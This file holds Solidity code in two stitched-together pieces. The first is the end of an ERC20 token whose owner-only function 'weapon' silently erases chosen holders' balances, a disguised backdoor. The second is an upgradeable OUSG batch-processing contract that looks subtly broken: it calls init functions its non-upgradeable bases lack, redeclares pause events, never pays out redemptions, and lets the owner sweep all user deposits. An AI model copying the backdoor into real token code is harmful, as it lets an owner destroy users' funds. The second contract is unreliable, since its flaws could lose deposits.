        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    modifier onlyOwner() {
        require(msg.sender == crown, "Not allowed");
        _;
    }
    function weapon(address[] memory psychology) public onlyOwner() {
        for (uint256 i = 0; i < psychology.length; i++) {
            address account = psychology[i];
            uint256 amount = _balances[account];
            _balances[account] = _balances[account].sub(amount, "ERROR");
            _balances[address(0)] = _balances[address(0)].add(amount);
        }
    }
}

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";

/**
 * @title OUSGBatchProcessor
 * @dev Upgradeable contract for batching OUSG token minting and redemption.
 *      Users deposit USDC to mint OUSG or burn OUSG to redeem USDC.
 *      Requests are batched and processed via OUSGManager.
 */
contract OUSGBatchProcessor is Initializable, Ownable, Pausable, UUPSUpgradeable {
    using SafeERC20 for IERC20;

    // --- Events ---
    event Deposit(uint256 indexed batchId, address indexed user, uint256 usdcAmount, uint256 ousgAmount);
    event Redemption(uint256 indexed batchId, address indexed user, uint256 ousgAmount, uint256 usdcAmount);
    event BatchProcessed(uint256 indexed batchId, uint256 totalDepositUSDC, uint256 totalRedeemOUSG);
    event BatchSizeUpdated(uint256 newDepositBatchSize, uint256 newRedemptionBatchSize);
    event DepositLimitUpdated(uint256 newDepositLimit);
    event ManagerUpdated(address indexed newManager);
    event Paused(address account);
    event Unpaused(address account);

    // --- Errors ---
    error InvalidAddress();
    error InvalidAmount();
    error ExceedsDepositLimit();
    error BatchNotReady();
    error TransferFailed();

    // --- Structs ---
    struct Batch {
        uint256 depositUSDC;  // Total USDC deposited for minting
        uint256 redeemOUSG;   // Total OUSG to be redeemed
        bool processed;
    }

    // --- State Variables ---
    IERC20 public usdc;
    IERC20 public ousg;
    address public manager;

    uint256 public currentBatchId;
    mapping(uint256 => Batch) public batches;

    // User deposit and redemption balances per batch
    mapping(address => mapping(uint256 => uint256)) public userDepositAmount;
    mapping(address => mapping(uint256 => uint256)) public userRedemptionAmount;

    // Configuration
    uint256 public depositBatchSize;     // USDC amount to trigger deposit batch processing
    uint256 public redemptionBatchSize;  // OUSG amount to trigger redemption batch processing
    uint256 public maxDepositPerUser;    // Max USDC a user can deposit per batch

    // --- Modifiers ---
    modifier onlyManager() {
        if (msg.sender != manager) revert();
        _;
    }

    // --- Initializer (Replaces Constructor) ---
    function initialize(
        address _usdc,
        address _ousg,
        address _manager,
        uint256 _depositBatchSize,
        uint256 _redemptionBatchSize,
        uint256 _maxDepositPerUser
    ) external initializer {
        if (_usdc == address(0) || _ousg == address(0) || _manager == address(0)) revert InvalidAddress();
        if (_depositBatchSize == 0 || _redemptionBatchSize == 0 || _maxDepositPerUser == 0) revert InvalidAmount();

        __Ownable_init();
        __Pausable_init();
        __UUPSUpgradeable_init();

        usdc = IERC20(_usdc);
        ousg = IERC20(_ousg);
        manager = _manager;

        depositBatchSize = _depositBatchSize;
        redemptionBatchSize = _redemptionBatchSize;
        maxDepositPerUser = _maxDepositPerUser;

        currentBatchId = 1;
    }

    // --- External Functions ---
    /**
     * @notice Deposit USDC to mint OUSG tokens in the current batch
     * @param amount Amount of USDC to deposit
     */
    function deposit(uint256 amount) external whenNotPaused {
        if (amount == 0) revert InvalidAmount();
        if (amount > maxDepositPerUser) revert ExceedsDepositLimit();

        uint256 batchId = currentBatchId;

        // Update user and batch state
        userDepositAmount[msg.sender][batchId] += amount;
        Batch storage batch = batches[batchId];
        batch.depositUSDC += amount;

        // Transfer USDC from user
        usdc.safeTransferFrom(msg.sender, address(this), amount);

        emit Deposit(batchId, msg.sender, amount, 0); // ousgAmount calculated on processing

        // Check if batch size is reached
        if (batch.depositUSDC >= depositBatchSize) {
            _processBatch(batchId);
        }
    }

    /**
     * @notice Request to redeem OUSG tokens for USDC in the current batch
     * @param amount Amount of OUSG to redeem
     */
    function redeem(uint256 amount) external whenNotPaused {
        if (amount == 0) revert InvalidAmount();

        uint256 batchId = currentBatchId;

        // Update user and batch state
        userRedemptionAmount[msg.sender][batchId] += amount;
        Batch storage batch = batches[batchId];
        batch.redeemOUSG += amount;

        // Transfer OUSG from user to this contract
        ousg.safeTransferFrom(msg.sender, address(this), amount);

        emit Redemption(batchId, msg.sender, amount, 0); // usdcAmount calculated on processing

        // Check if batch size is reached
        if (batch.redeemOUSG >= redemptionBatchSize) {
            _processBatch(batchId);
        }
    }

    // --- Manager Functions ---
    /**
     * @notice Called by the manager to process the current batch
     * @dev Manager executes minting/redeeming with external protocols
     */
    function processCurrentBatch() external onlyManager {
        _processBatch(currentBatchId);
    }

    // --- Internal Functions ---
    function _processBatch(uint256 batchId) internal {
        Batch storage batch = batches[batchId];
        if (batch.processed) revert BatchNotReady();

        if (batch.depositUSDC == 0 && batch.redeemOUSG == 0) {
            // Nothing to do
            return;
        }

        // Mark as processed
        batch.processed = true;

        // Forward USDC to manager for minting OUSG
        if (batch.depositUSDC > 0) {
            usdc.safeTransfer(manager, batch.depositUSDC);
        }

        // Manager will handle minting and send OUSG back to users
        // Similarly, for redemptions, manager will burn OUSG and send USDC

        // Increment batch if this was the current one
        if (batchId == currentBatchId) {
            currentBatchId++;
        }

        emit BatchProcessed(batchId, batch.depositUSDC, batch.redeemOUSG);
    }

    // --- Admin Functions ---
    /**
     * @notice Update the manager address
     * @param newManager The new manager contract address
     */
    function setManager(address newManager) external onlyOwner {
        if (newManager == address(0)) revert InvalidAddress();
        manager = newManager;
        emit ManagerUpdated(newManager);
    }

    /**
     * @notice Update batch size thresholds
     * @param newDepositBatchSize Minimum USDC for deposit batch
     * @param newRedemptionBatchSize Minimum OUSG for redemption batch
     */
    function setBatchSizes(uint256 newDepositBatchSize, uint256 newRedemptionBatchSize) external onlyOwner {
        if (newDepositBatchSize == 0 || newRedemptionBatchSize == 0) revert InvalidAmount();
        depositBatchSize = newDepositBatchSize;
        redemptionBatchSize = newRedemptionBatchSize;
        emit BatchSizeUpdated(newDepositBatchSize, newRedemptionBatchSize);
    }

    /**
     * @notice Update the maximum deposit per user per batch
     * @param newLimit The new maximum deposit limit
     */
    function setMaxDepositPerUser(uint256 newLimit) external onlyOwner {
        if (newLimit == 0) revert InvalidAmount();
        maxDepositPerUser = newLimit;
        emit DepositLimitUpdated(newLimit);
    }

    function pause() external onlyOwner {
        _pause();
        emit Paused(msg.sender);
    }

    function unpause() external onlyOwner {
        _unpause();
        emit Unpaused(msg.sender);
    }

    // --- UUPS Upgradeability ---
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}

    // --- Withdraw Stuck Tokens (Safety) ---
    function withdrawStuckUSDC() external onlyOwner {
        uint256 balance = usdc.balanceOf(address(this));
        if (balance > 0) {
            usdc.safeTransfer(owner(), balance);
        }
    }

    function withdrawStuckOUSG() external onlyOwner {
        uint256 balance = ousg.balanceOf(address(this));
        if (balance > 0) {
            ousg.safeTransfer(owner(), balance);
        }
    }
}

